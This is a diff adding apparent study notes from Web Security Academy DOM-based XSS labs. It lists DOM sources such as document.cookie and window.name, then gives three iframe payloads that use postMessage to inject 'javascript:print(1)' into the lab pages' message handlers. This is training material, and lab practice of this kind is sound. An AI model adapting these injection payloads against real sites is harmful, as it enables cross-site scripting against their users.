@@ -1,0 +1,46 @@
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+Database
+
+
+<iframe src="https://0a4100f704dad9d180771c2b00670016.web-security-academy.net/" 
+width=500 height=500 onload="this.contentWindow.postMessage('javascript:print(1)//http:','*')">
+
+<iframe src="https://0af0005904bc15af80083a7d003d006f.web-security-academy.net/" 
+width=500 height=500 onload="this.contentWindow.postMessage('{
+  "type": "load_channel",
+  "url": "javascript:print(1)",
+"width": "20",
+"height":"20"
+}','*')">
+
+
+<iframe 
+  src="https://0af0005904bc15af80083a7d003d006f.web-security-academy.net/"
+  width="500"
+  height="500"
+  onload="this.contentWindow.postMessage(JSON.stringify({ 
+    type: 'page-load' 
+  }), '*'); 
+  this.contentWindow.postMessage(JSON.stringify({
+    type: 'load-channel',
+    url: 'javascript:print(1)'
+  }), '*');
+  this.contentWindow.postMessage(JSON.stringify({
+    type: 'player-height-changed',
+    width: 600,
+    height: 400
+  }), '*');"
+>
+</iframe>
